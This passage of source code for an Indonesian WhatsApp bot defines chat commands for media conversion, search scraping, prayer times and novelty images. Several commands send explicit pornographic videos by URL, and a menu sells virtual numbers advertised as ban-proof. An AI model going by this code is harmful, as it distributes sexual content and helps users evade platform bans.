let imgso = `https://quickchart.io/chart?v=2.9.4&c=%7B%0A%20%20type%3A%20%27doughnut%27%2C%0A%20%20data%3A%20%7B%0A%20%20%20%20datasets%3A%20%5B%0A%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20data%3A%20%5B${tot.freePercentage}%2C%20${tot.usedPercentage}%5D%2C%0A%20%20%20%20%20%20%20%20backgroundColor%3A%20%5B%27%2326AC00%27%2C%20%27red%27%5D%2C%0A%20%20%20%20%20%20%20%20label%3A%20%27Dataset%201%27%2C%0A%20%20%20%20%20%20%20%20borderWidth%3A%200%2C%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%5D%2C%0A%20%20%20%20labels%3A%20%5B%27A%27%2C%20%27C%27%5D%2C%0A%20%20%7D%2C%0A%20%20options%3A%20%7B%0A%20%20%20%20circumference%3A%20Math.PI%2C%0A%20%20%20%20rotation%3A%20Math.PI%2C%0A%20%20%20%20cutoutPercentage%3A%2075%2C%0A%20%20%20%20layout%3A%20%7B%0A%20%20%20%20%20%20padding%3A%2080%2C%0A%20%20%20%20%7D%2C%0A%20%20%20%20legend%3A%20%7B%0A%20%20%20%20%20%20display%3A%20false%2C%0A%20%20%20%20%7D%2C%0A%20%20%20%20plugins%3A%20%7B%0A%20%20%20%20%20%20datalabels%3A%20%7B%0A%20%20%20%20%20%20%20%20color%3A%20%27%23404040%27%2C%0A%20%20%20%20%20%20%20%20anchor%3A%20%27end%27%2C%0A%20%20%20%20%20%20%20%20align%3A%20%27end%27%2C%0A%20%20%20%20%20%20%20%20formatter%3A%20(val)%20%3D%3E%20val%20%2B%20%27%25%27%2C%0A%20%20%20%20%20%20%20%20font%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20size%3A%2025%2C%0A%20%20%20%20%20%20%20%20%20%20weight%3A%20%27bold%27%2C%0A%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20doughnutlabel%3A%20%7B%0A%20%20%20%20%20%20%20%20labels%3A%20%5B%0A%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20%27%5CnPing%20Status%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20font%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20size%3A%2020%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20%27%5Cn${latensi.toFixed(4)}s%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%27%23000%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20font%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20size%3A%2025%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20weight%3A%20%27bold%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%5D%2C%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%7D%2C%0A%20%20%7D%2C%0A%7D`
Ditss.sendMessage(m.chat, {
text: respon,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {
title: salam,
thumbnailUrl: imgso,
sourceUrl: null,
mediaType: 1,
renderLargerThumbnail: false
}
}
}, {quoted: m})
} catch (err) {
console.log(err)
reply(`Platform tidak didukung.`)
}
}
break



case 'toanime': case 'jadianime':{
async function toanime(buffer) {
 try {
 const base64String = Buffer.from(buffer, 'binary').toString('base64');
 const apiResponse = await axios.post('https://www.drawever.com/api/photo-to-anime', {
 data: `data:image/png;base64,${base64String}`,
 }, {
 headers: {
 'Content-Type': 'application/json',
 },
 });
 return 'https://www.drawever.com' + apiResponse.data.urls[1] || 'https://www.drawever.com' + apiResponse.data.urls[0];
 } catch (error) {
 throw error;
 }
}

	let q = m.quoted ? m.quoted : m;
	let mime = (q.msg || q).mimetype || q.mediaType || "";
 let mime_ = `Kirim/Reply Gambar Dengan Caption ${prefix + command}`

if (!mime) throw mime_
if (!/image\/(jpe?g|png)/.test(mime)) throw `Mime ${mime} tidak support`;
	let media = await q.download() 
 let cap = '*Result from* : ' + prefix + command

let res = await toanime(media);
//await conn.sendFile(m.chat, res, '', cap, m)
Ditss.sendMessage(m.chat, { caption: `${cap}`, image: { url: res }}, {quoted: m});
}
break



case 'toaudio':{
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Reply video/audio dengan caption ${prefix + command}`)
if (!quoted) return reply(`Reply video/audio dengan caption ${prefix + command}`)
//await loading()
var dl = await m.quoted.download()
Ditss.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: false }, {quoted: m })
}
break



case 'tovn':{
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Reply video/audio dengan caption ${prefix + command}`)
if (!quoted) return reply(`Reply video/audio dengan caption ${prefix + command}`)
//await loading()
var dl = await m.quoted.download()
Ditss.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: true }, {quoted: m })
}
break



case 'kivotos': {
 if (!isPremium && !isCreator) return m.reply("Fitur Khusus Premium !!!")
 if (!text) return reply('Contoh: .kivotos hutao genshin impact, modern')
 await Ditss.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
 m.reply(`waitt sedang mencari ${ki}${text}${ka}`)
 try {
// await Ditss.sendMessage(m.chat, { image : { url : `https://love.neekoi.me/kivotos?text=${full_args}` }, caption: `𝗣𝗿𝗼𝗺𝗽𝘁𝘀:\n${full_args}` }, { quoted: m })
 await Ditss.sendMessage(m.chat,{
			 image: {url:`https://love.neekoi.me/kivotos?text=${full_args}`},
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: `> done ${text}`,
					footer: `\n${botname2}`,
					buttons: [
						{
							buttonId: `.kivotos ${text}`,
							buttonText: {
								displayText: "lanjutt"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
 } catch (err) {
 reply(err)
 }
 await Ditss.sendMessage(m.chat, { react: { text: "🎉",key: m.key,}})
 }
 break



case 'kivotos2': {
 if (!isPremium && !isCreator) return m.reply("Fitur Khusus Premium !!!")
 if (!text) return reply('Contoh: .kivotos hutao genshin impact, modern')
 await Ditss.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
 m.reply(`waitt sedang mencari${command}`)
 try {
 await Ditss.sendMessage(m.chat, { image : { url : `https://love.neekoi.me/kivotos?text=${full_args}` }, caption: `𝗣𝗿𝗼𝗺𝗽𝘁𝘀:\n${full_args}` }, { quoted: m })
 } catch (err) {
 reply(err)
 }
 await Ditss.sendMessage(m.chat, { react: { text: "🎉",key: m.key,}})
 }
 break



case 'kivotos3': {
 if (!isPremium) return m.reply("Fitur Khusus Premium !!!")
 if (!text) return reply('Contoh: .kivotos hutao genshin impact, modern')
 await Ditss.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
 m.reply("Tunggu 30 detik...")
 try {
 await Ditss.sendMessage(m.chat, { image : { url : `https://love.neekoi.me/kivotos?text=${full_args}` }, caption: `𝗣𝗿𝗼𝗺𝗽𝘁𝘀:\n${full_args}` }, { quoted: m })
 } catch (err) {
 reply(err)
 }
 await Ditss.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
 }
 break



case 'google': {
const axios = require('axios');
const cheerio = require('cheerio');

async function google(query) {
 try {
 const url = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
 const response = await axios.get(url, {
 headers: {
 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
 }
 });
 const html = response.data;
 const $ = cheerio.load(html);

 const results = [];
 $("div.tF2Cxc").each((index, element) => {
 const title = $(element).find("h3").text().trim();
 const link = $(element).find("a").attr("href");
 const description = $(element).find(".VwiC3b").text().trim();

 if (title && link) {
 results.push({ title, link, description });
 }
 });

 return results;
 } catch (error) {
 console.error("Error fetching search results:", error.message);
 throw new Error("Gagal mengambil data pencarian.");
 }
}
 
 if (!args[0]) return m.reply("❗ Masukkan kata kunci pencarian!");

 const query = args.join(" ");
 try {
 const results = await google(query);

 if (results.length === 0) return m.reply("❌ Tidak ada hasil ditemukan.");

 let caption = `🔍 *Hasil Pencarian untuk: "${query}"*\n\n`;
 results.forEach((result, index) => {
 caption += `⭐ *${index + 1}. ${result.title}*\n`;
 caption += `🔗 *Link*: ${result.link}\n`;
 caption += `📝 *Deskripsi*: ${result.description || "Deskripsi tidak tersedia."}\n\n`;
 });

 const imageUrl = "https://files.catbox.moe/ggxx14.jpg"; 
 //await Ditss.sendFile(m.chat, imageUrl, "result.jpg", caption.trim(), m);
     await   Ditss.sendMessage(m.chat,{
			 image: {url:imageUrl},
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: caption,
					footer: `\n${botname2}`,
					buttons: [
						{
							buttonId: ``,
							buttonText: {
								displayText: "gatau"
							}
						},
					],
					viewOnce: true,
				}, {
					quoted: m
				});
 } catch (error) {
 console.error("Error:", error.message);
 m.reply("⚠️ Terjadi kesalahan saat mengambil data.");
 }
}
break






/*case 'art':
case 'awoo':
case 'bts':
case 'cogan':
case 'elaina2':
case 'exo':
case 'elf':
case 'estetic':
case 'kanna':
case 'loli':
case 'neko':
case 'waifu':
case 'shota':
case 'husbu':
case 'sagiri':
case 'shinobu':
case 'megumin':
case 'wallnime':
case 'quotesimage':
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
Ditss.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=haikalgans` } })
break //Powered By Kym*/
case 'bokep1':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah1 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2022/08/Brigitte-fucked-at-the-gym.mp4`)
Ditss.sendMessage(from, { video: ntahlah1, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep2':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah2 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Black-Widow-handcuffed-bondage-play.mp4`)
Ditss.sendMessage(from, { video: ntahlah2, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep3':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah3 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Black-Widow-handcuffed-bondage-play.mp4`)
Ditss.sendMessage(from, { video: ntahlah3, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep4':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah4 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/2B-outdoor-reverse-cowgirl-Sound-update.mp4`)
Ditss.sendMessage(from, { video: ntahlah4, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep5':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah5 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Nyotengu-riding-with-help.mp4`)
Ditss.sendMessage(from, { video: ntahlah5, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep6':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah6 = await getBuffer(`https://media.discordapp.net/attachments/632434742427516948/1055565623914147910/GrandLiveDinosaur.mp4`)
Ditss.sendMessage(from, { video: ntahlah6, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep7':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah7 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Siona-taking-it-deep.mp4`)
Ditss.sendMessage(from, { video: ntahlah7, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep8':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah8 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Callie-working-in-Hooters.mp4`)
Ditss.sendMessage(from, { video: ntahlah8, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep9':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah9 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell.mp4`)
Ditss.sendMessage(from, { video: ntahlah9, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep10':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah10 = await getBuffer(`https://www.pornhub.com/view_video.php?viewkey=ph62dacb17ee77a`)
Ditss.sendMessage(from, { video: ntahlah10, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep11':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah11 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell-With-makeup.mp4`)
Ditss.sendMessage(from, { video: ntahlah11, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep12':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah12 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell-With-makeup.mp4`)
Ditss.sendMessage(from, { video: ntahlah12, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep13':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah13 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell.mp4`)
Ditss.sendMessage(from, { video: ntahlah13, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep14':
if (!isCreator&&!isPremium) return reply(mess.prem)
//if (!isGroup) return onlyGroup()
let ntahlah14 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Callie-working-in-Hooters.mp4`)
Ditss.sendMessage(from, { video: ntahlah14, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep15':
if (!isCreator&&!isPremium) return reply(mess.prem)
//if (!isGroup) return onlyGroup()
let ntahlah15 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Siona-taking-it-deep.mp4`)
Ditss.sendMessage(from, { video: ntahlah15, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep16':
if (!isCreator&&!isPremium) return reply(mess.prem)
//if (!isGroup) return onlyGroup()
let ntahlah16 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Ballerina-bot-facial.mp4`)
Ditss.sendMessage(from, { video: ntahlah16, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep17':
if (!isCreator&&!isPremium) return reply(mess.prem)
//if (!isGroup) return onlyGroup()
let ntahlah17 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Nyotengu-riding-with-help.mp4`)
Ditss.sendMessage(from, { video: ntahlah17, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep18':
if (!isCreator&&!isPremium) return reply(mess.prem)
//if (!isGroup) return onlyGroup()
let ntahlah18 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/2B-outdoor-reverse-cowgirl-Sound-update.mp4`)
Ditss.sendMessage(from, { video: ntahlah18, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break



case "info-bot": case "info-adit":{
await Ditss.sendMessage(m.chat,
{ text: `hallo🤝${tag} ${salam} gaada info nya🗿`,
contextInfo:{
mentionedJid:[m.sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `no acces`,
"body": `..`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": ppuser,
"sourceUrl": `${linksaluran}`}}},
{ quoted: qtext})
}
break



case 'jadwalsholat': {
if (!text) return reply(`• *Example :* ${prefix + command} jakarta pusat`)
async function jadwalSholat(kota) {
 try {
 const { data } = await axios.get(`https://www.dream.co.id/jadwal-sholat/${kota}/`);
 const $ = cheerio.load(data);
 const rows = $(".table-index-jadwal tbody tr");
 const jadwal = [];
 rows.each((index, row) => {
 const cols = $(row).find("td");
 jadwal.push({
 subuh: $(cols[1]).text().trim(),
 duha: $(cols[2]).text().trim(),
 zuhur: $(cols[3]).text().trim(),
 asar: $(cols[4]).text().trim(),
 magrib: $(cols[5]).text().trim(),
 isya: $(cols[6]).text().trim(),
 });
 });
 return jadwal[0];
 } catch (error) {
 throw new Error("Gagal mengambil data jadwal sholat");
 }
}
 try {
 const jadwal = await jadwalSholat(text);
 const caption = `
┌「 ${text.toUpperCase()} 」
├ Subuh: ${jadwal.subuh}
├ Dhuha: ${jadwal.duha}
├ Dzuhur: ${jadwal.zuhur}
├ Ashar: ${jadwal.asar}
├ Maghrib: ${jadwal.magrib}
├ Isya: ${jadwal.isya}
└──────────`.trim();
 const thumbnailUrl = "https://files.catbox.moe/r3mbjq.jpg";
 await Ditss.sendMessage(m.chat, {
 text: caption,
 contextInfo: {
 forwardingScore: 2025,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363391204793452@newsletter',
 serverMessageId: null,
 newsletterName: `${botname2}`,
 },
 externalAdReply: {
 title: `Jadwal Sholat Harian`,
 mediaType: 1,
 previewType: 1,
 body: `Informasi waktu sholat untuk kota ${text}`,
 thumbnailUrl,
 renderLargerThumbnail: true,
 mediaUrl: "https://www.islamicfinder.org",
 sourceUrl: "https://www.islamicfinder.org",
 },
 },
 }, { quoted: m });
 } catch (error) {
 m.reply("Gagal mendapatkan jadwal sholat. Pastikan nama kota benar.");
 }
}
break



case 'sertifikat-baik':case 'stkbaik':{
Ditss.sendMessage(m.chat, { image: { url: `https://mdsay.xyz/api/v1?key=md&api=baik&nama=${text}_`}, caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${text}`}, { quoted: m})
}
break
case 'sertifikat-cantik':case 'stkcantik': {
Ditss.sendMessage(m.chat, { image: { url: `https://mdsay.xyz/api/v1?key=md&api=cantik&nama=${text}_`}, caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${text}`}, { quoted: m})
}
break
case 'sertifikat-ganteng':case 'stkganteng': {
Ditss.sendMessage(m.chat, { image: { url: `https://mdsay.xyz/api/v1?key=md&api=ganteng&nama=${text}_`}, caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${text}`}, { quoted: m})
}
break
case 'sertifikat-hitam':case 'stkhitam': {
 Ditss.sendMessage(m.chat, { image: { url: `https://mdsay.xyz/api/v1?key=md&api=hitam&nama=${text}_`}, caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${text}`}, { quoted: m})
}
break
case 'sertifikat-miskin':case 'stkmiskin': {
Ditss.sendMessage(m.chat, { image: { url: `https://mdsay.xyz/api/v1?key=md&api=miskin&nama=${text}_`}, caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${text}`}, { quoted: m})
}
break
case 'sertifikat-kaya':case 'stkkaya': {
Ditss.sendMessage(m.chat, { image: { url: `https://mdsay.xyz/api/v1?key=md&api=kaya&nama=${text}_`}, caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${text}`}, { quoted: m})
}
break
case 'sertifikat-marah':case 'stkmarah': {
 Ditss.sendMessage(m.chat, { image: { url: `https://mdsay.xyz/api/v1?key=md&api=marah&nama=${text}_`}, caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${text}`}, { quoted: m})
}
break
case 'sertifikat-sabar':case 'stksabar': {
 Ditss.sendMessage(m.chat, { image: { url: `https://mdsay.xyz/api/v1?key=md&api=sabar&nama=${text}_`}, caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${text}`}, { quoted: m})
}
break
case 'sertifikat-sakit':case 'stksakiti': {
 Ditss.sendMessage(m.chat, { image: { url: `https://mdsay.xyz/api/v1?key=md&api=sakiti&nama=${text}_`}, caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${text}`}, { quoted: m})
}
break
case 'sertifikat-keren':case 'stkkeren': {
 Ditss.sendMessage(m.chat, { image: { url: `https://mdsay.xyz/api/v1?key=md&api=keren&nama=${text}_`}, caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${text}`}, { quoted: m})
}
break
case 'sertifikat-misterius':case 'stkmisterius': {
 Ditss.sendMessage(m.chat, { image: { url: `https://mdsay.xyz/api/v1?key=md&api=misterius&nama=${text}_`}, caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${text}`}, { quoted: m})
}
break
case 'sertifikat-santai':case 'stksantai': {
 Ditss.sendMessage(m.chat, { image: { url: `https://mdsay.xyz/api/v1?key=md&api=santai&nama=${text}_`}, caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${text}`}, { quoted: m})
}
break
case 'sertifikat-sombong':case 'stksombong': {
 Ditss.sendMessage(m.chat, { image: { url: `https://mdsay.xyz/api/v1?key=md&api=sombong&nama=${text}_`}, caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${text}`}, { quoted: m})
}
break
case 'sertifikat-lucu':case 'stklucu': {
 Ditss.sendMessage(m.chat, { image: { url: `https://mdsay.xyz/api/v1?key=md&api=lucu&nama=${text}_`}, caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${text}`}, { quoted: m})
}
break
case 'sertifikat-gila': case 'stkgila': {
if(!text) return reply('mana nama nya kak..')
Ditss.sendMessage(m.chat, { image: { url: `https://mdsay.xyz/api/v1?key=md&api=gila&nama=${text}_`}, caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${text}`}, { quoted: m})
}
break






			case 'siaep':
			case 'up-code': {
if (!isCreator) return Reply(global.mess.owner)
if (!text) return m.reply(example("reply fitur"))
const fiturbaru = `${text}`;
await Ditss.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
				const caption = `FITUR`;
				Ditss.sendMessage(m.chat,{
			 image: {url:`https://files.catbox.moe/xpmnyj.jpg`},
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: caption,
					footer: `${text}`,
					buttons: [
{
 name: "cta_copy",
 buttonParamsJson: JSON.stringify({
 display_text: "Copy Fitur",
 copy_code: `${fiturbaru}`
 })
}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
			}
			break



case"listserver": case "listp": {
if (!isCreator) return reply(mess.owner)
 let page = args[0] ? args[0] : '1';
 let f = await fetch(domain + "/api/application/servers?page=" + page, {
 "method": "GET",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey
 }
 });
 let res = await f.json();
 let servers = res.data;
 let sections = [];
 let messageText = "Berikut adalah daftar server:\n\n";
 
 for (let server of servers) {
 let s = server.attributes;
 
 let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
 "method": "GET",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + capikey
 }
 });
 
 let data = await f3.json();
 let status = data.attributes ? data.attributes.current_state : s.status;
 
 messageText += `ID Server: ${s.id}\n`;
 messageText += `Nama Server: ${s.name}\n`;
 messageText += `Status: ${status}\n\n`;
 }
 
 messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 messageText += `Total Server: ${res.meta.pagination.count}`;
 
 await Ditss.sendMessage(m.chat, { text: messageText }, { quoted: m });
 
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 m.reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
 }
}
break



case "galau":case 'randomvid':{
const caption = `.`;
let kontol = await fetchJson('https://raw.githubusercontent.com/ditss-dev/ditss/main/video-random');
let mmk = kontol[Math.floor(Math.random() * kontol.length)];
	Ditss.sendMessage(m.chat,{
			 video: {url:mmk},
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: caption,
					footer: `\n${botname2}`,
					buttons: [
						{
							buttonId: `.${command}`,
							buttonText: {
								displayText: "lanjutt"
							}
						},
                       						{
							buttonId: `.toaudio`,

							buttonText: {
								displayText: "back sound"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
			}
			break



case 'nomor-kosong':
			case 'nokos':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.users[m.sender];
				let me = m.sender;
				let hehe = ``;
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								body: proto.Message.InteractiveMessage.Body.create({
									text: hehe
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: '`List Nokos WhatsApp` 🐣\n\n> ° Aman 100%\n> ° Anti Kenon\n> ° Anti Banned\n> ° Harga Sesuai Kualitas\n> ° Aman Pasang Botz\n\n```pilih sesui kebutuhan yaaa!..``` '
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									...(await prepareWAMessageMedia({ image: global.pathimg }, { upload: Ditss.waUploadToServer })), 
									title: '',
									subtitle: '',
									hasMediaAttachment: false
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "Pilihan Nokos WhatsApp!.🍃", 
 sections: [{
 highlight_label: "Harga Rp 10,000 ",
 rows: [{
 header: 'Indonesia',
 title: "+62 xxx",
 description: `Nokos WhatsApp`,
 id: `.belinokos`
 }]}, {
 highlight_label: "Harga Rp 7,000 ",
 rows: [{
 header: 'Amerika',
 title: "+1 xxx",
 description: `Nokos WhatsApp`,
 id: `.belinokos`
 }]}, {
 highlight_label: "Harga Rp 14,000 ",
 rows: [{
 header: 'Malaysia',
 title: "+60 xxx",
 description: `Nokos WhatsApp`,
 id: `.belinokos`
 }]},{
 highlight_label: "Harga Rp 23,000 ",
 rows: [{
 header: 'Brazil',
 title: "+55 xxx",
 description: `Nokos WhatsApp`,
 id: `.belinokos`
 }]},{
 highlight_label: "Harga Rp 18,000 ",
 rows: [{
 header: 'Myanmar',
 title: "+95 xxx",
 description: `Nokos WhatsApp`,
 id: `.belinokos`
 }]},{
 highlight_label: "Harga Rp 12,000 ",
 rows: [{
 header: 'Afganistan',
 title: "+93 xxx",
 description: `Nokos WhatsApp`,
 id: `.belinokos`
 },{
 header: 'Owner',
 title: "Nomor Owner Botz",
 description: ``,
 id: `.owner`
 }]
 }]
 })
}
									],
								}),
								contextInfo: {
									mentionedJid: [m.sender], 
									forwardingScore: 1,
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: idSaluran,
										newsletterName: "list nokos ditss",
										serverMessageId: 143
									}
								}
							})
						}
					}
				}, { quoted: m })

				await Ditss.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
			}
			break



case 'intro':{
let kontol = `𝐈𝐍𝐓𝐑𝐎
𝐍𝐀𝐌𝐀
𝐔𝐌𝐔𝐑
𝐊𝐄𝐋𝐀𝐒
𝐀𝐒𝐊𝐎𝐓:
𝐀𝐆𝐀𝐌𝐀
𝐒𝐓𝐀𝐓𝐔𝐒:`
reply(kontol)
}
break



case "toes2":{
Ditss.sendMessage(m.chat, {
	text: "ntahlahh ",
	footer: "Ditss si pler kudaa",
	buttons: [
		{
			buttonId: "#1",
			buttonText: {
				displayText: "panel😹"
			},
			type: 1
		},
		{
			buttonId: "#2",
			buttonText: {
				displayText: "nokos😹"
			},
			type: 1
		},
		{
			buttonId: "listbtns",
			buttonText: {
				displayText: "ih nak lahh"
			},
			nativeFlowInfo: {
name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "Pilihan Nokos WhatsApp!.🍃", 
 sections: [{
 highlight_label: "Harga Rp 6,000 ",
 rows: [{
 header: 'Indonesia',
 title: "+62 xxx",
 description: `Nokos WhatsApp`,
 id: `.belinokos`
 }]}, {
 highlight_label: "Harga Rp 7,000 ",
 rows: [{
 header: 'Amerika',
 title: "+1 xxx",
 description: `Nokos WhatsApp`,
 id: `.belinokos`
 }]}, {
 highlight_label: "Harga Rp 8,000 ",
 rows: [{
 header: 'Malaysia',
 title: "+60 xxx",
 description: `Nokos WhatsApp`,
 id: `.belinokos`
 }]},{
 highlight_label: "Harga Rp 11,000 ",
 rows: [{
 header: 'Brazil',
 title: "+55 xxx",
 description: `Nokos WhatsApp`,
 id: `.belinokos`
 }]},{
 highlight_label: "Harga Rp 10,000 ",
 rows: [{
 header: 'Myanmar',
 title: "+95 xxx",
 description: `Nokos WhatsApp`,
 id: `.belinokos`
 }]},{
 highlight_label: "Harga Rp 12,000 ",
 rows: [{
 header: 'Afganistan',
 title: "+93 xxx",
 description: `Nokos WhatsApp`,
 id: `.belinokos`
 },{
 header: 'Owner',
 title: "Nomor Owner Botz",
 description: ``,
 id: `.owner`
 }]
 }]
 })
			},
			type: 2
